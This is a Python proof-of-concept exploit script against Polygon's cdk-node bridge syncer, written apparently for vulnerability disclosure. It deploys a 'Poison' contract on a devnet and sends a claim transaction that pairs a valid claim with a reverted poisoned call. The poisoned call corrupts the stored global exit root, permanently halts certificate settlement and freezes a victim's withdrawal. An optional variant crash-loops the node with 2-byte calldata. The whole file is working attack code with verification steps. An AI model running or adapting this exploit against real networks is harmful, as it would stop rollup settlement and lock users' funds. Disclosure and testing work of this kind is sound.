#!/usr/bin/env python3
# =============================================================================
# ONE-SHOT PoC — Claim-Calldata Trace Poisoning in cdk-node (0xPolygon/cdk)
#
# Target     : bridgesync/downloader.go (calldata extraction from
#              debug_traceTransaction) + aggsender (impact)
# Variant B  : one tx = 1 valid claim + 1 reverted poisoned call
#              -> bridgesync stores poisoned GER -> aggsender can never build
#              a certificate -> PERMANENT settlement halt + frozen user funds
# Variant A  : (optional --crash) 2-byte calldata -> input[:4] panic ->
#              cdk-node crash loop
#
# FLOW IS 100% NORMAL:
#   real L1 bridge deposit -> GER inserted on L1 -> AggOracle propagates GER
#   to L2 -> real claim on L2 (valid proof) -> real withdrawal on L2.
#   NO synthetic state, NO RollupManager/GER manipulation, NO mock proofs.
#
# Phases:
#   P0  prerequisites + devnet freshness gate
#   P1  BEFORE  — normal deposit + valid claim -> healthy settlement
#   P2  EXPLOIT — one attack transaction
#   P3  AFTER   — trace analysis + poisoned DB row
#   P4  IMPACT  — settlement halt, observed for --watch minutes
#   P5  IMPACT  — victim withdrawal frozen in escrow
#   P6  IMPACT  — persists across node restart
#   P7  (--crash) Variant A crash loop
#
# Usage:  python3 poc.py [--watch 10] [--crash]
# Needs:  docker, foundry (cast), python3 stdlib only
# Output: everything under ./evidence/ ; exit code 0 iff all hard checks pass
# =============================================================================

import argparse, json, pathlib, re, sqlite3, subprocess, sys, time

# ----------------------------- EDIT ME --------------------------------------
L1_RPC, L2_RPC = "http://localhost:8545", "http://localhost:8547"
NODE           = "cdk-node"                                    # container name
DB_PATH        = "/app/data/bridgesync-l2.db"                  # BridgeL2Sync.DBPath
CERTS          = "/app/data/certs"                             # SaveCertificatesToFilesPath

BRIDGE_L1 = "0x70e0ba845a1a0f2da3359c97e0285013525ffc49"       # L1 bridge
BRIDGE_L2 = "0x4ed7c70f96b99c776995fb64377f0d4ab3b0e1c1"       # L2 bridge
GER_L1    = "0x95401dc811bb5740090279ba06cfa8fcf6113778"       # GlobalExitRoot V2

ATTACKER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"        # devnet-funded acct
PK_ATK   = "0xac0974bec39a17e36ba4a6ff4d22b03c699b947e62f77d99e7361e6315bd32d8"
VICTIM   = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"        # SEPARATE account
PK_VIC   = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"

# forge build once, then:  jq -r .bytecode out/Poison.sol/Poison.json
# auto-load creation bytecode from forge build (running by run.sh)
def _load_init():
    p = pathlib.Path(__file__).resolve().parent / "out/Poison.sol/Poison.json"
    try:
        b = json.loads(p.read_text())["bytecode"]
        if isinstance(b, dict): b = b.get("object", "")   # 
        return b if b.startswith("0x") else "0x" + b
    except Exception:
        return ""
POISON_INIT = _load_init()
assert len(POISON_INIT) > 10, "empty bytecode — run: forge build (or ./run.sh)"
# -----------------------------------------------------------------------------

AMOUNT     = 10**15                       # 0.001 ETH per deposit
JUNK_MER   = "0x" + "00"*28 + "deadbe01"  # must match Poison.sol constants
JUNK_RER   = "0x" + "00"*28 + "deadbe02"

CLAIM_SIG   = "claimOnly(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
ATTACK_SIG  = "attackWorstCase(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
CRASH_SIG   = "attackCrash(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
SEL_CLAIM   = "ccaa2d11"
CLAIM_TOPIC = "0x1df3f2a973a00d6635911755c260704e95e8a5876997546798770f76396fda4d"
ERR_SUB     = "error getting info by global exit root"        # aggsender.go:160 loop
ZERO32      = "0x" + "00"*32

EV = pathlib.Path("evidence"); EV.mkdir(exist_ok=True)
RESULTS, M = [], {}          # metrics for the final BEFORE/AFTER table

# ------------------------------- helpers ------------------------------------
def run(cmd, ok=False):
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0 and not ok:
        raise RuntimeError(f"cmd failed: {' '.join(cmd)}\nstderr: {r.stderr.strip()[-600:]}")
    return r.returncode, r.stdout.strip(), r.stderr.strip()

def cc(addr, sig, args=(), rpc=L1_RPC):        # cast call -> (rc, out, err)
    return run(["cast", "call", addr, sig, *args, "--rpc-url", rpc], ok=True)

def cs(to, sig, args=(), rpc=L2_RPC, pk=PK_ATK, value=None, tag=""):  # cast send
    cmd = ["cast", "send", to, *([sig, *args] if sig else []),
           "--rpc-url", rpc, "--private-key", pk, "--json"]
    if value is not None: cmd += ["--value", str(value)]
    rc, out, _ = run(cmd)
    save(f"receipt_{tag or json.loads(out)['transactionHash'][:10]}.json", out)
    return json.loads(out)

def create(code, rpc, pk):                     # cast send --create
    rc, out, _ = run(["cast", "send", "--create", code,
                      "--rpc-url", rpc, "--private-key", pk, "--json"])
    save("receipt_deploy_poison.json", out)
    return json.loads(out)["contractAddress"]

def kk(h):        return run(["cast", "keccak", h])[1]        # keccak(0x...)
def kk2(a, b):    return kk("0x" + a[2:] + b[2:])
def receipt(txh, rpc=L2_RPC):
    return json.loads(run(["cast", "receipt", txh, "--json", "--rpc-url", rpc])[1])
def head(rpc):    return run(["cast", "block-number", "--rpc-url", rpc])[1]
def bal(addr, rpc=L2_RPC):
    return int(run(["cast", "rpc", "eth_getBalance", addr, "latest", "--rpc-url", rpc])[1], 16)

def save(name, content): (EV / name).write_text(content)
def trace_tx(txh):
    return run(["cast", "rpc", "debug_traceTransaction", txh,
                '{"tracer":"callTracer"}', "--rpc-url", L2_RPC])[1]

def eventually(fn, timeout, step=5):
    end = time.time() + timeout
    while time.time() < end:
        try:
            if fn(): return True
        except Exception: pass
        time.sleep(step)
    return False

def record(status, name):
    RESULTS.append((status, name)); print(f"  [{status}] {name}")

def check(name, fn=None, timeout=0, soft=False):
    ok = eventually(fn, timeout) if timeout else bool(fn())
    record(("PASS" if ok else ("WARN" if soft else "FAIL")), name)
    return ok

# ---- log tailing (full log, no grep — nothing gets hidden) ------------------
LOG = EV / "node.log"; _logproc = None
def start_log_tail():
    global _logproc
    f = open(LOG, "wb")
    _logproc = subprocess.Popen(["docker", "logs", "-f", "--timestamps", NODE],
                                stdout=f, stderr=subprocess.STDOUT)
def log_text(): return LOG.read_text(errors="ignore")
def log_since(off): return LOG.read_bytes()[off:].decode(errors="ignore")
def err_count(t=None): return (t if t is not None else log_text()).count(ERR_SUB)
def last_metric(key):
    v = re.findall(rf"{key}: (\d+)", log_text())
    return int(v[-1]) if v else None

def cert_heights():
    _, out, _ = run(["docker", "exec", NODE, "sh", "-c", f"ls {CERTS} 2>/dev/null"], ok=True)
    return sorted(int(m.group(1)) for f in out.split()
                  if (m := re.match(r"certificate_(\d+)-\d+\.json", f)))
def node_up():
    _, out, _ = run(["docker", "ps", "--filter", f"name={NODE}",
                     "--format", "{{.Status}}"], ok=True)
    return out.startswith("Up")
def restart_count():
    _, out, _ = run(["docker", "inspect", "-f", "{{.RestartCount}}", NODE], ok=True)
    return int(out or 0)
def restart_policy():
    _, out, _ = run(["docker", "inspect", "-f", "{{.HostConfig.RestartPolicy.Name}}", NODE], ok=True)
    return out

# ---- bridgesync DB dump (docker cp + stdlib sqlite) -------------------------
def dump_claims(tag, tries=3):
    for _ in range(tries):
        try:
            for suf in ("", "-wal", "-shm"):
                run(["docker", "cp", f"{NODE}:{DB_PATH}{suf}",
                     f"{EV}/{tag}_bridgesync.db{suf}"], ok=True)
            con = sqlite3.connect(f"{EV}/{tag}_bridgesync.db")
            rows = con.execute(
                "SELECT block_num, global_index, mainnet_exit_root, rollup_exit_root,"
                " global_exit_root, destination_network, metadata, is_message"
                " FROM claim ORDER BY block_num").fetchall()
            con.close()
            save(f"claims_{tag}.json", json.dumps(rows, default=str, indent=1))
            return rows
        except Exception as e:
            time.sleep(3)
    raise RuntimeError("cannot read bridgesync db — wrong container/path?")

def h64(v):
    s = v.hex() if isinstance(v, bytes) else str(v)
    return s.lower().replace("0x", "").rjust(64, "0")[-64:]

# ---- exit-tree math, CALIBRATED against on-chain state ----------------------
def build_ladder(z0):
    z = [z0]
    for _ in range(31): z.append(kk2(z[-1], z[-1]))
    return z
LADDER_FLAT  = build_ladder(ZERO32)                 # empty leaf  = 0x0
LADDER_HASH  = build_ladder(kk2(ZERO32, ZERO32))    # empty leaf  = keccak(0,0)

def deposit_leaf(origin_net, origin_token, dest_net, dest_addr, amount, meta):
    body = ("00" + f"{origin_net:08x}" + origin_token[2:].lower().zfill(40)
            + f"{dest_net:08x}" + dest_addr[2:].lower() + f"{amount:064x}"
            + kk(meta)[2:])
    return kk("0x" + body)

def root_single(l, Z):
    n = l
    for i in range(32): n = kk2(n, Z[i])
    return n
def root_pair(l0, l1, Z):
    n = kk2(l0, l1)
    for i in range(1, 32): n = kk2(n, Z[i])
    return n
def root_triple(l0, l1, l2, Z):
    n = kk2(kk2(l0, l1), kk2(l2, Z[0]))
    for i in range(2, 32): n = kk2(n, Z[i])
    return n
def blob(ps): return "0x" + "".join(p[2:] for p in ps)
def proof_leaf0(Z):   return blob(Z)
def proof_leaf1(l0, Z): return blob([l0] + Z[1:])
def proof_leaf2(l0, l1, Z): return blob([Z[0], kk2(l0, l1)] + Z[2:])
def ger(mer, rer): return kk2(mer, rer)

def q_bytes32(addr, getter, rpc=L1_RPC):
    rc, out, err = cc(addr, getter)
    assert rc == 0, f"{getter} failed: {err}"
    return out
def q_uint(addr, getter, rpc=L1_RPC):
    rc, out, err = cc(addr, getter)
    assert rc == 0, f"{getter} failed: {err}"
    return int(out, 16)

def calibrate(mer_onchain, meta):
    """Ground truth: on-chain MER after deposit #1 == fold(leaf, empty ladder).
    Determines (a) leaf originToken (0x0 vs WETH), (b) SMT zero convention."""
    cands = ["0x" + "00"*20]
    rc, out, _ = cc(BRIDGE_L1, "WETHToken()(address)")
    if rc == 0 and out: cands.append(out)
    for tok in cands:
        leaf = deposit_leaf(1, tok, 0, ATTACKER, AMOUNT, meta)
        for name, Z in (("flat", LADDER_FLAT), ("hashed", LADDER_HASH)):
            if root_single(leaf, Z) == mer_onchain:
                print(f"  calibrated: originToken={tok} smtZero={name}")
                return tok, Z, leaf
    raise RuntimeError(
        "calibration failed — no candidate leaf matches on-chain MER.\n"
        "Inspect the deposit BridgeEvent: cast receipt <deposit_tx> --json "
        "and compare fields; then adjust deposit_leaf().")

def bridge_asset(rpc, pk, dest_net, dest_addr, amount, meta, tag, to):
    """bridgeAsset — auto-detects 6-arg (sovereign) vs 5-arg (etrog) ABI."""
    for sig, extra in (("bridgeAsset(uint32,address,uint256,address,bool,bytes)", ["false"]),
                       ("bridgeAsset(uint32,address,uint256,address,bytes)", [])):
        try:
            return cs(to, sig, [str(dest_net), dest_addr, str(amount),
                                "0x0000000000000000000000000000000000000000",
                                *extra, meta],
                      rpc=rpc, pk=pk, value=amount, tag=tag)
        except Exception:
            continue
    raise RuntimeError("bridgeAsset failed with both known signatures")

def claim_args(blob, gi, mer, rer, tok, meta):
    return [blob, str(gi), mer, rer, "1", tok, "0", ATTACKER, str(AMOUNT), meta]

def wait_claim_sim(poison, sig, args, timeout=600):
    """Poll by SIMULATING the claim (eth_call). Success == GER propagated on
    L2 AND proof AND params all valid. Prints revert reason on failure."""
    end, t0 = time.time() + timeout, time.time()
    while time.time() < end:
        rc, out, err = cc(poison, sig, args, rpc=L2_RPC)
        if rc == 0: return True
        if time.time() - t0 > 30:
            print(f"    [sim pending] revert: {err.strip()[:160]}"); t0 = time.time()
        time.sleep(5)
    return False

def claim_receipt_ok(rc):
    st = int(str(rc.get("status", 0)), 16)
    logs = rc.get("logs", [])
    n = len(logs) if isinstance(logs, list) else int(logs or 0)
    topic = logs[0]["topics"][0] if isinstance(logs, list) and logs else None
    return st == 1, n, topic

def walk_frames(call, frames):
    if str(call.get("to", "")).lower() == BRIDGE_L2.lower(): frames.append(call)
    for c in call.get("calls", []): walk_frames(c, frames)
def gi_at(inp):   # globalIndex = arg 2 => bytes [2052:2084] of calldata
    b = bytes.fromhex(inp[2:])
    return (int.from_bytes(b[2052:2084], "big"), len(b)) if len(b) >= 2084 else (None, len(b))

# ------------------------------- phases --------------------------------------
def p0_prereqs():
    print("\n== P0: PREREQUISITES & FRESHNESS GATE ==")
    check("cdk-node container is up", node_up)
    start_log_tail()
    check("L1 RPC responsive", lambda: head(L1_RPC) != "")
    check("L2 RPC responsive and producing blocks",
          lambda: head(L2_RPC) != "" and eventually(
              lambda: head(L2_RPC) != h0, 60) if (h0 := head(L2_RPC)) else False)
    check("aggsender is building certificates (devnet ready)",
          lambda: "building certificate" in log_text(), timeout=600)
    dc = q_uint(BRIDGE_L1, "depositCount()(uint32)")
    check(f"L1 mainnet exit tree is empty (depositCount == 0, got {dc})", lambda: dc == 0)
    check("no certificate errors on a fresh devnet (err count == 0)",
          lambda: err_count() == 0)
    rows = dump_claims("prereq")
    check(f"bridgesync claim table empty (got {len(rows)} rows)", lambda: len(rows) == 0)
    M["numBridges_baseline"] = last_metric("numBridges") or 0

def p1_before():
    print("\n== P1: BEFORE — NORMAL FLOW (deposit -> GER -> valid claim -> healthy settlement) ==")
    # -- deposit #1 (real L1 bridge deposit, leaf index 0)
    bridge_asset(L1_RPC, PK_ATK, 0, ATTACKER, AMOUNT, "0x01", "deposit1", BRIDGE_L1)
    check("deposit #1 accepted (depositCount == 1)",
          lambda: q_uint(BRIDGE_L1, "depositCount()(uint32)") == 1)
    mer1 = q_bytes32(GER_L1, "mainnetExitRoot()(bytes32)")
    tok, Z, leaf0 = calibrate(mer1, "0x01")
    gi0 = (1 << 64) + 0

    # -- deploy attacker contract (like any user contract)
    poison = create(POISON_INIT + BRIDGE_L2[2:].lower().zfill(64), L2_RPC, PK_ATK)
    print(f"  Poison deployed at {poison}"); M["poison"] = poison

    # -- poll the REAL claim (simulation) until AggOracle has propagated GER
    def pair():
        return (q_bytes32(GER_L1, "mainnetExitRoot()(bytes32)"),
                q_bytes32(GER_L1, "rollupExitRoot()(bytes32)"))
    mer, rer = pair()
    args = claim_args(proof_leaf0(Z), gi0, mer, rer, tok, "0x01")
    check("L1 deposit GER propagated to L2 (AggOracle); claim simulation passes",
          lambda: wait_claim_sim(poison, CLAIM_SIG, args, timeout=0) or
                  wait_claim_sim(poison, CLAIM_SIG, claim_args(
                      proof_leaf0(Z), gi0, *pair(), tok, "0x01"), timeout=0),
          timeout=600)
    mer, rer = pair()
    rc = cs(poison, CLAIM_SIG, claim_args(proof_leaf0(Z), gi0, mer, rer, tok, "0x01"),
            tag="control_claim")
    ok, n, topic = claim_receipt_ok(rc)
    check("control claim mined: status=1, exactly 1 log, ClaimEvent topic",
          lambda: ok and n == 1 and topic == CLAIM_TOPIC)
    ger_ctl = ger(mer, rer)

    # -- bridgesync picks it up with VALID calldata (happy path works!)
    def ctl_row():
        return any(int(r[1]) == gi0 and h64(r[4]) == h64(ger_ctl)
                   for r in dump_claims("before"))
    check("BEFORE: bridgesync stored VALID GER for the control claim "
          f"(0x{h64(ger_ctl)[:16]}...)", ctl_row, timeout=600, soft=False)
    check("BEFORE: aggsender builds certificate with numClaims=1 and NO error",
          lambda: "numClaims: 1" in log_text() and err_count() == 0, timeout=600)
    check("BEFORE: certificate sent to AggLayer",
          lambda: "sent successfully" in log_text(), timeout=240, soft=True)
    time.sleep(20)   # let the in-flight certificate finish sending
    M.update(err_before=err_count(), certs_before=cert_heights(),
             ger_ctl=ger_ctl, tok=tok, Z=Z, leaf0=leaf0, poison=poison)
    return poison, tok, Z, leaf0

def p2_exploit(poison, tok, Z, leaf0):
    print("\n== P2: EXPLOIT — ONE ATTACK TRANSACTION ==")
    # -- deposit #2 (leaf index 1) — again a 100% normal deposit
    bridge_asset(L1_RPC, PK_ATK, 0, ATTACKER, AMOUNT, "0x02", "deposit2", BRIDGE_L1)
    check("deposit #2 accepted (depositCount == 2)",
          lambda: q_uint(BRIDGE_L1, "depositCount()(uint32)") == 2)
    leaf1 = deposit_leaf(1, tok, 0, ATTACKER, AMOUNT, "0x02")
    mer2 = q_bytes32(GER_L1, "mainnetExitRoot()(bytes32)")
    check("exit-tree math matches on-chain MER after deposit #2 (self-check)",
          lambda: mer2 == root_pair(leaf0, leaf1, Z))
    gi1 = (1 << 64) + 1

    def go():
        mer, rer = (q_bytes32(GER_L1, "mainnetExitRoot()(bytes32)"),
                    q_bytes32(GER_L1, "rollupExitRoot()(bytes32)"))
        return claim_args(proof_leaf1(leaf0, Z), gi1, mer, rer, tok, "0x02")
    check("attack claim simulation passes (GER propagated)", lambda: wait_claim_sim(
        poison, ATTACK_SIG, go(), timeout=0) or wait_claim_sim(
        poison, ATTACK_SIG, go(), timeout=0), timeout=600)
    rc = cs(poison, ATTACK_SIG, go(), tag="attack")
    ok, n, topic = claim_receipt_ok(rc)
    check("attack tx mined: status=1 (outer tx SUCCEEDS), 1 log, ClaimEvent topic",
          lambda: ok and n == 1 and topic == CLAIM_TOPIC)
    txh = rc["transactionHash"]

    # -- raw trace + mechanical proof of the root causes
    save("trace_attack.json", trace_tx(txh))
    frames = []
    walk_frames(json.loads((EV / "trace_attack.json").read_text()), frames)
    claim_frames = [f for f in frames if f.get("input", "0x")[2:10] == SEL_CLAIM]
    valid = [f for f in claim_frames if "error" not in f]
    junk  = [f for f in claim_frames if "error" in f
             and gi_at(f["input"])[0] == gi1]
    check("trace: >= 2 claimAsset calls to the bridge in ONE tx",
          lambda: len(claim_frames) >= 2)
    check("trace: exactly 1 claimAsset frame WITHOUT error (the valid claim)",
          lambda: len(valid) == 1)
    check("trace: >= 1 claimAsset frame WITH error + SAME globalIndex "
          "(reverted call is still recorded — root cause #2)",
          lambda: len(junk) >= 1)
    if junk:
        print(f"    junk frame reverted with: {junk[0].get('error')}")
    M["attack_offset"] = len(LOG.read_bytes())
    return gi1

def p3_after(gi1):
    print("\n== P3: AFTER — POISONED DATABASE ==")
    check("bridgesync synced the attack claim (numClaims counter moves)",
          lambda: "numClaims: 2" in log_text()
                  or "numClaims: 1" in log_since(M["attack_offset"])
                  or err_count() > 0, timeout=900)
    junk_ger = ger(JUNK_MER, JUNK_RER)
    rows = dump_claims("after")
    check(f"AFTER: claim row global_index={gi1} stores POISONED GER "
          f"(0x{h64(junk_ger)[:16]}..., not the valid one)",
          lambda: any(int(r[1]) == gi1 and h64(r[4]) == h64(junk_ger) for r in rows))
    check("AFTER: poisoned row has JUNK mainnet/rollup exit roots (overwrite proof)",
          lambda: any(int(r[1]) == gi1 and h64(r[2]) == h64(JUNK_MER)
                      and h64(r[3]) == h64(JUNK_RER) for r in rows))
    check("AFTER: the CONTROL claim row still holds its valid GER "
          "(selective overwrite — root cause #3)",
          lambda: any(h64(r[4]) == h64(M["ger_ctl"]) for r in rows))
    check("IMPACT: aggsender certificate build FAILS, repeating every epoch (6s)",
          lambda: err_count() >= 5, timeout=900)
    M.update(junk_ger=junk_ger, err_after_start=err_count())

def p4_halt(watch_min):
    print(f"\n== P4: IMPACT — SETTLEMENT HALT, OBSERVED FOR {watch_min} MINUTES ==")
    h0, e0 = cert_heights(), err_count()
    fb0 = set(re.findall(r"FromBlock: (\d+)", log_since(M["attack_offset"])))
    for i in range(watch_min):
        time.sleep(60)
        print(f"    [{i+1}/{watch_min} min] errors={err_count()} "
              f"certs={cert_heights()}")
    check(f"certificate count FROZEN for {watch_min} minutes "
          f"({h0} -> {cert_heights()})",
          lambda: cert_heights() == h0)
    check("certificate FromBlock is PINNED (settlement can never advance)",
          lambda: set(re.findall(r"FromBlock: (\d+)", log_since(M["attack_offset"]))) == fb0)
    check(f"error loop still running (>= {watch_min*5} errors accumulated)",
          lambda: err_count() >= e0 + watch_min * 5)
    M.update(certs_after=cert_heights(), err_final=err_count(),
             pinned_fromblock=(fb0 or {"?"}).pop())

def p5_frozen_funds():
    print("\n== P5: IMPACT — VICTIM FUNDS FROZEN (withdrawal AFTER the attack) ==")
    run(["cast", "send", VICTIM, "--value", "1000000000000000000",
         "--rpc-url", L2_RPC, "--private-key", PK_ATK, "--json"])
    vb0, esc0 = bal(VICTIM), bal(BRIDGE_L2)
    bridge_asset(L2_RPC, PK_VIC, 1, VICTIM, AMOUNT, "0x", "victim_withdrawal", BRIDGE_L2)
    vb1, esc1 = bal(VICTIM), bal(BRIDGE_L2)
    check("victim withdrawal SUCCEEDED on L2 (balance dropped, funds left the user)",
          lambda: vb0 - vb1 >= AMOUNT)
    check("funds are now held by the L2 bridge escrow (+exact amount)",
          lambda: esc1 - esc0 == AMOUNT)
    check("victim exit is VISIBLE to bridgesync (numBridges grew) "
          "but settlement is still dead",
          lambda: (last_metric("numBridges") or 0) >= M["numBridges_baseline"] + 1
                  and err_count() > 0, timeout=900)
    M.update(victim_before=vb0, victim_after=vb1, escrow_before=esc0, escrow_after=esc1)
    print("    => exit root can never reach L1 (no certificate => no settle"
          " => claim on L1 impossible): FUNDS ARE FROZEN")

def p6_persistence():
    print("\n== P6: IMPACT — PERSISTS ACROSS NODE RESTART ==")
    run(["docker", "restart", NODE])
    check("cdk-node restarted and is up", lambda: node_up(), timeout=300)
    e0 = err_count()
    check("poisoned data survives restart — certificate error resumes "
          "(persistent SQLite poisoning, no auto-recovery)",
          lambda: err_count() > e0, timeout=900)
    rows = dump_claims("post_restart")
    check("poisoned claim row still present after restart",
          lambda: any(h64(r[4]) == h64(M["junk_ger"]) for r in rows))

def p7_crash(tok, Z, leaf0, leaf1):
    print("\n== P7: VARIANT A — CRASH LOOP (input[:4] unguarded slice) ==")
    print(f"    (container restart policy: {restart_policy()})")
    bridge_asset(L1_RPC, PK_ATK, 0, ATTACKER, AMOUNT, "0x03", "deposit3", BRIDGE_L1)
    leaf2 = deposit_leaf(1, tok, 0, ATTACKER, AMOUNT, "0x03")
    mer3 = q_bytes32(GER_L1, "mainnetExitRoot()(bytes32)")
    check("exit-tree math matches after deposit #3", lambda: mer3 == root_triple(leaf0, leaf1, leaf2, Z))
    gi2 = (1 << 64) + 2
    def go():
        mer, rer = (q_bytes32(GER_L1, "mainnetExitRoot()(bytes32)"),
                    q_bytes32(GER_L1, "rollupExitRoot()(bytes32)"))
        return claim_args(proof_leaf2(leaf0, leaf1, Z), gi2, mer, rer, tok, "0x03")
    check("crash-claim simulation passes (GER propagated)",
          lambda: wait_claim_sim(M["poison"], CRASH_SIG, go(), timeout=0)
                  or wait_claim_sim(M["poison"], CRASH_SIG, go(), timeout=0), timeout=600)
    rc = cs(M["poison"], CRASH_SIG, go(), tag="attack_crash")
    ok, n, topic = claim_receipt_ok(rc)
    check("crash tx mined (valid claim + 2-byte call)", lambda: ok and n == 1)
    save("trace_crash.json", trace_tx(rc["transactionHash"]))
    frames = []
    walk_frames(json.loads((EV / "trace_crash.json").read_text()), frames)
    check("trace contains a bridge call with input < 4 bytes",
          lambda: any(len(bytes.fromhex(f["input"][2:])) < 4 for f in frames))
    if restart_policy() in ("unless-stopped", "always"):
        check("cdk-node PANICS and enters a crash-restart loop "
              "(RestartCount keeps increasing)",
              lambda: restart_count() >= 2, timeout=600)
        check("panic stack trace in log: 'slice bounds out of range'",
              lambda: "slice bounds out of range" in log_text(), timeout=120)
    else:
        check("cdk-node PANICS and dies (no restart policy set)",
              lambda: not node_up(), timeout=600)
        check("panic stack trace in log: 'slice bounds out of range'",
              lambda: "slice bounds out of range" in log_text(), timeout=120)

def summary():
    print("\n" + "=" * 78)
    print(" BEFORE / AFTER EXPLOIT — SUMMARY")
    print("=" * 78)
    g = lambda k, d="n/a": M.get(k, d)
    print(f"""
  certificate build errors : {g('err_before', 0)}                        -> {g('err_final')}  (every 6s, forever)
  certificates sent        : {g('certs_before')}                          -> {g('certs_after')}  (FROZEN)
  settlement range         : advancing                       -> PINNED at FromBlock {g('pinned_fromblock')}
  claims in bridgesync DB  : 1 row, VALID GER 0x{h64(g('ger_ctl'))[:12]}… -> 2 rows, last one POISONED 0x{h64(g('junk_ger','0'))[:12]}…
  victim L2 balance        : {g('victim_before')} wei           -> {g('victim_after')} wei  (0.001 ETH left the user)
  L2 bridge escrow         : {g('escrow_before')} wei           -> {g('escrow_after')} wei  (locked, unclaimable on L1)
  node restart             : -                               -> error RESUMES (persistent poisoning)

  Root cause (bridgesync/downloader.go):
    1. methodID := input[:4]                 -> no length check      (Variant A)
    2. DFS over call frames, 'error' field   -> reverted calls parsed (root cause)
       never checked
    3. LIFO stack + match by globalIndex only-> poisoned call overwrites
                                                the valid claim calldata
  Impact (aggsender/aggsender.go:160): certificate build fails forever
  => settlement halt => all post-attack exits frozen.
""")
    save("summary.txt", "\n".join(f"[{s}] {n}" for s, n in RESULTS))

def main():
    ap = argparse.ArgumentParser(description="One-shot PoC — cdk bridgesync calldata poisoning")
    ap.add_argument("--watch", type=int, default=10, help="minutes of halt observation (default 10)")
    ap.add_argument("--crash", action="store_true", help="also run Variant A (crash loop) at the end")
    a = ap.parse_args()

    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║  ONE-SHOT PoC — Claim-Calldata Trace Poisoning (0xPolygon/cdk)   ║")
    print("║  Normal flow only: real deposits, real GER, real claims         ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    try:
        p0_prereqs()
        poison, tok, Z, leaf0 = p1_before()
        gi1 = p2_exploit(poison, tok, Z, leaf0)
        p3_after(gi1)
        p4_halt(a.watch)
        p5_frozen_funds()
        p6_persistence()
        if a.crash: p7_crash(tok, Z, leaf0, leaf1 := deposit_leaf(1, tok, 0, ATTACKER, AMOUNT, "0x02"))
    finally:
        if _logproc: _logproc.terminate()

    print("\n---- RESULTS ----")
    for s, n in RESULTS: print(f"[{s}] {n}")
    print(f"\nEvidence bundle: {EV.resolve()}/ "
          "(receipts, traces, DB dumps, full node.log, summary)")
    summary()
    hard = [s for s, _ in RESULTS if s == "FAIL"]
    sys.exit(1 if hard else 0)

if __name__ == "__main__":
    main()
